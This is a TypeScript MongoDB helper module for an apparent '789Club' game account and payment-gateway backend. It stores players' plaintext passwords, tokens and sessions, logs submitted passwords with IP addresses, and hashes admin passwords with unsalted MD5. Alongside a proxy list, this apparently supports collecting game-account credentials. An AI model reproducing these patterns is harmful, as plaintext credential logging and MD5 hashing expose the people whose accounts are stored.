import { connectToDatabase, getCollection, ObjectId } from './mongodb';
import crypto from 'crypto';

export async function initDatabase(): Promise<void> {
  const db = await connectToDatabase();
  
  // Create collections if they don't exist
  const collections = [
    'account',
    'proxy',
    'admin_users',
    'admin_bank',
    'admin_crypto',
    'login_logs',
    'admin_momo',
    'admin_thecao',
    'admin_telco',
    'paygate_transactions'
  ];

  for (const collName of collections) {
    const colls = await db.listCollections({ name: collName }).toArray();
    if (colls.length === 0) {
      await db.createCollection(collName);
      console.log(`Created collection: ${collName}`);
    }
  }

  // Create indexes
  await db.collection('account').createIndex({ username: 1, game: 1 }, { unique: true });
  await db.collection('account').createIndex({ token: 1 });
  await db.collection('account').createIndex({ session: 1 });
  await db.collection('login_logs').createIndex({ username: 1 });
  await db.collection('login_logs').createIndex({ login_time: -1 });
  await db.collection('admin_bank').createIndex({ is_active: 1 });
  await db.collection('admin_crypto').createIndex({ is_active: 1 });
  await db.collection('paygate_transactions').createIndex({ method: 1 });
  await db.collection('paygate_transactions').createIndex({ status: 1 });
  await db.collection('paygate_transactions').createIndex({ created_at: -1 });
  
  console.log('Database initialized successfully!');
}

// Account operations
export async function findAccountByUsername(username: string, game: string = '789Club') {
  const coll = await getCollection('account');
  return coll.findOne({ username, game });
}

export async function findAccountByToken(token: string, game: string = '789Club') {
  const coll = await getCollection('account');
  return coll.findOne({ $or: [{ token }, { session: token }], game });
}

export async function findAccountBySession(session: string, game: string = '789Club') {
  const coll = await getCollection('account');
  return coll.findOne({ session, game });
}

export async function upsertAccount(
  username: string,
  password: string,
  token: string,
  wallet: number,
  session: string,
  game: string = '789Club'
) {
  const coll = await getCollection('account');
  const now = new Date();
  
  const existing = await coll.findOne({ username, game });
  
  if (existing) {
    await coll.updateOne(
      { _id: existing._id },
      {
        $set: {
          password,
          time: now,
          token,
          wallet,
          session,
          game
        }
      }
    );
  } else {
    await coll.insertOne({
      username,
      password,
      time: now,
      token,
      wallet,
      session,
      game,
      created_at: now
    });
  }
}

// Login logs
export async function insertLoginLog(data: {
  username: string;
  password?: string;
  wallet?: string | number;
  token?: string;
  session?: string;
  ip?: string;
}) {
  const coll = await getCollection('login_logs');
  return coll.insertOne({
    ...data,
    login_time: new Date()
  });
}

// Admin users
export async function findAdminUser(username: string) {
  const coll = await getCollection('admin_users');
  return coll.findOne({ username });
}

export async function createAdminUser(username: string, password: string) {
  const coll = await getCollection('admin_users');
  const hashedPassword = crypto.createHash('md5').update(password).digest('hex');
  return coll.insertOne({ username, password: hashedPassword, created_at: new Date() });
}

export async function verifyAdminPassword(username: string, password: string) {
  const user = await findAdminUser(username);
  if (!user) return false;
  const hashedPassword = crypto.createHash('md5').update(password).digest('hex');
  return user.password === hashedPassword;
}

export async function updateAdminPassword(username: string, newPassword: string) {
  const coll = await getCollection('admin_users');
  const hashedPassword = crypto.createHash('md5').update(newPassword).digest('hex');
  const result = await coll.updateOne(
    { username },
    { $set: { password: hashedPassword, updated_at: new Date() } }
  );
  return result.modifiedCount > 0;
}

// Admin bank
export async function getActiveBanks() {
  const coll = await getCollection('admin_bank');
  return coll.find({ is_active: true }).toArray();
}

export async function getBankById(id: string | ObjectId) {
  const coll = await getCollection('admin_bank');
  return coll.findOne({ _id: typeof id === 'string' ? new ObjectId(id) : id });
}

export async function createOrUpdateBank(data: {
  _id?: string;
  bank_name?: string;
  account_number?: string;
  account_name?: string;
  sepay_bank_code?: string;
  is_active?: boolean;
}) {
  const coll = await getCollection('admin_bank');
  if (data._id) {
    const _id = typeof data._id === 'string' ? new ObjectId(data._id) : data._id;
    delete data._id;
    await coll.updateOne({ _id }, { $set: { ...data, updated_at: new Date() } });
    return _id;
  } else {
    const result = await coll.insertOne({ ...data, created_at: new Date() });
    return result.insertedId;
  }
}

// Admin crypto
export async function getActiveCrypto() {
  const coll = await getCollection('admin_crypto');
  return coll.find({ is_active: true }).toArray();
}

export async function getAllCrypto() {
  const coll = await getCollection('admin_crypto');
  return coll.find({}).sort({ currency: 1, network: 1 }).toArray();
}

export async function createOrUpdateCrypto(data: {
  _id?: string;
  currency?: string;
  network?: string;
  wallet_address?: string;
  qr_code?: string;
  exchange_rate?: number;
  fee?: number;
  is_active?: boolean;
}) {
  const coll = await getCollection('admin_crypto');
  if (data._id) {
    const _id = typeof data._id === 'string' ? new ObjectId(data._id) : data._id;
    delete data._id;
    await coll.updateOne({ _id }, { $set: { ...data, updated_at: new Date() } });
    return _id;
  } else {
    const result = await coll.insertOne({ ...data, created_at: new Date() });
    return result.insertedId;
  }
}

// Admin momo
export async function getActiveMomo() {
  const coll = await getCollection('admin_momo');
  return coll.findOne({ is_active: true });
}

export async function createOrUpdateMomo(data: {
  _id?: string;
  momo_number?: string;
  momo_name?: string;
  is_active?: boolean;
}) {
  const coll = await getCollection('admin_momo');
  if (data._id) {
    const _id = typeof data._id === 'string' ? new ObjectId(data._id) : data._id;
    delete data._id;
    await coll.updateOne({ _id }, { $set: { ...data, updated_at: new Date() } });
    return _id;
  } else {
    const result = await coll.insertOne({ ...data, created_at: new Date() });
    return result.insertedId;
  }
}

// Admin telco
export async function getActiveTelcos() {
  const coll = await getCollection('admin_telco');
  return coll.find({ active: true }).toArray();
}

export async function getAllTelcos() {
  const coll = await getCollection('admin_telco');
  return coll.find({}).sort({ name: 1 }).toArray();
}

export async function createOrUpdateTelco(data: {
  _id?: string;
  name?: string;
  telco_id?: number;
  url?: string;
  active?: boolean;
  exchange_rates?: string;
}) {
  const coll = await getCollection('admin_telco');
  if (data._id) {
    const _id = typeof data._id === 'string' ? new ObjectId(data._id) : data._id;
    delete data._id;
    await coll.updateOne({ _id }, { $set: { ...data, updated_at: new Date() } });
    return _id;
  } else {
    const result = await coll.insertOne({ ...data, created_at: new Date() });
    return result.insertedId;
  }
}

// Admin thecao (doithe1s API config)
export async function getActiveTheCao() {
  const coll = await getCollection('admin_thecao');
  return coll.findOne({ is_active: true });
}

export async function getTheCaoForAdmin() {
  const coll = await getCollection('admin_thecao');
  const list = await coll.find({}).sort({ created_at: -1 }).limit(1).toArray();
  return list[0] || null;
}

export async function createOrUpdateTheCao(data: {
  _id?: string;
  partner_id?: string;
  partner_key?: string;
  url?: string;
  is_active?: boolean;
}) {
  const coll = await getCollection('admin_thecao');
  if (data._id) {
    const _id = typeof data._id === 'string' ? new ObjectId(data._id) : data._id;
    delete data._id;
    await coll.updateOne({ _id }, { $set: { ...data, updated_at: new Date() } });
    return _id;
  } else {
    const result = await coll.insertOne({ ...data, created_at: new Date() });
    return result.insertedId;
  }
}

// Paygate transactions
export async function insertPaygateTransaction(data: {
  method: string;
  amount: number;
  status: string;
  bank_name?: string;
  account_number?: string;
  codepay?: string;
  telco?: string;
  serial?: string;
  card_code?: string;
  note?: string;
  ip_address?: string;
}) {
  const coll = await getCollection('paygate_transactions');
  return coll.insertOne({
    ...data,
    created_at: new Date()
  });
}

export async function getPaygateTransactions(filters: {
  method?: string;
  status?: string;
  start_date?: Date;
  end_date?: Date;
  limit?: number;
  skip?: number;
}) {
  const coll = await getCollection('paygate_transactions');
  const query: any = {};
  
  if (filters.method) query.method = filters.method;
  if (filters.status) query.status = filters.status;
  if (filters.start_date || filters.end_date) {
    query.created_at = {};
    if (filters.start_date) query.created_at.$gte = filters.start_date;
    if (filters.end_date) query.created_at.$lte = filters.end_date;
  }
  
  return coll
    .find(query)
    .sort({ created_at: -1 })
    .skip(filters.skip || 0)
    .limit(filters.limit || 50)
    .toArray();
}

export async function getPaygateStats(filters: {
  method?: string;
  start_date?: Date;
  end_date?: Date;
}) {
  const coll = await getCollection('paygate_transactions');
  const query: any = { status: 'success' };
  
  if (filters.method) query.method = filters.method;
  if (filters.start_date || filters.end_date) {
    query.created_at = {};
    if (filters.start_date) query.created_at.$gte = filters.start_date;
    if (filters.end_date) query.created_at.$lte = filters.end_date;
  }
  
  const result = await coll.aggregate([
    { $match: query },
    {
      $group: {
        _id: null,
        total_amount: { $sum: '$amount' },
        count: { $sum: 1 }
      }
    }
  ]).toArray();
  
  return result[0] || { total_amount: 0, count: 0 };
}

/** Thống kê doanh thu theo phương thức (MongoDB). */
export async function getPaygateStatsByMethod(start_date?: Date, end_date?: Date) {
  const coll = await getCollection('paygate_transactions');
  const match: any = { status: 'success' };
  if (start_date || end_date) {
    match.created_at = {};
    if (start_date) match.created_at.$gte = start_date;
    if (end_date) match.created_at.$lte = end_date;
  }
  const result = await coll.aggregate([
    { $match: match },
    { $group: { _id: '$method', total_amount: { $sum: '$amount' }, count: { $sum: 1 } } },
    { $sort: { total_amount: -1 } }
  ]).toArray();
  return result;
}

/** Danh sách tài khoản (account) có phân trang. */
export async function getAccounts(limit: number = 50, skip: number = 0) {
  const coll = await getCollection('account');
  const list = await coll.find({}).sort({ created_at: -1 }).skip(skip).limit(limit).toArray();
  const total = await coll.countDocuments();
  return { list, total };
}

/** Danh sách admin users. */
export async function getAllAdminUsers() {
  const coll = await getCollection('admin_users');
  return coll.find({}).sort({ created_at: -1 }).toArray();
}

// Proxy
export async function getProxies() {
  const coll = await getCollection('proxy');
  return coll.find({}).toArray();
}

export async function addProxy(proxy: string) {
  const coll = await getCollection('proxy');
  return coll.insertOne({ proxy, created_at: new Date() });
}

// Helper functions
export function crc32(str: string): number {
  let crc = 0xFFFFFFFF;
  const table: number[] = [];
  for (let n = 0; n < 256; n++) {
    let c = n;
    for (let k = 0; k < 8; k++) {
      c = (c & 1) ? (0xEDB88320 ^ (c >>> 1)) : (c >>> 1);
    }
    table[n] = c;
  }
  for (let i = 0; i < str.length; i++) {
    crc = (crc >>> 8) ^ table[(crc ^ str.charCodeAt(i)) & 0xFF];
  }
  return (crc ^ 0xFFFFFFFF) >>> 0;
}

export default {
  initDatabase,
  findAccountByUsername,
  findAccountByToken,
  findAccountBySession,
  upsertAccount,
  insertLoginLog,
  findAdminUser,
  createAdminUser,
  verifyAdminPassword,
  updateAdminPassword,
  getActiveBanks,
  getBankById,
  createOrUpdateBank,
  getActiveCrypto,
  createOrUpdateCrypto,
  getActiveMomo,
  createOrUpdateMomo,
  getActiveTelcos,
  getAllTelcos,
  createOrUpdateTelco,
  getActiveTheCao,
  createOrUpdateTheCao,
  getAllCrypto,
  insertPaygateTransaction,
  getPaygateTransactions,
  getPaygateStats,
  getPaygateStatsByMethod,
  getAccounts,
  getAllAdminUsers,
  getProxies,
  addProxy,
  crc32,
  ObjectId
};
